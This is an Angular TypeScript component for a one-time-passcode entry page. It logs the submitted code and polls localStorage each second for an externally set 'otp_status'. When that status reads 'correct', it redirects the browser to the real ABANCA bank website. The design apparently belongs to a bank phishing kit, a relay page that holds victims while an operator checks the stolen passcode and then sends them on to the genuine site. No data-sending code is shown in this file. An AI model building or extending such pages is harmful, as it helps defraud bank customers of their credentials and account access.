import { Component, OnInit } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { Subscription, interval } from 'rxjs';

@Component({
  selector: 'app-otp',
  templateUrl: './otp.component.html',
  styleUrls: ['./otp.component.css']
})
export class OtpComponent implements OnInit {
  otpForm: FormGroup;
otpCorrect: any;
correctOtp: string = '123456';
private submissionUpdateSubscription!: Subscription;
loading: any;

  constructor(private fb: FormBuilder) {
    this.otpForm = this.fb.group({
      otp: ['', [Validators.required]]
    });
  }

  ngOnInit(): void {}

  onSubmit(): void {
    if (this.otpForm.valid) {
      console.log('OTP Submitted', this.otpForm.value);
      this.loading = true;
      this.otpCorrect = null;
      const enteredOtp = this.otpForm.value.otp;
     
        // Subscribe to periodic 
    this.submissionUpdateSubscription = interval(1000).subscribe(() => {
      const otpStatus = localStorage.getItem('otp_status');
      if(otpStatus == 'correct'){
        this.loading = false;
        this.otpCorrect = true;
        window.location.href = 'https://www.abanca.com/';
      }else if(otpStatus == 'incorrect'){
        this.loading = false;
        this.otpCorrect = false;
      }
        
    });
        
      
    } else {
      console.log('OTP Form Not Valid');
    }
  }
}
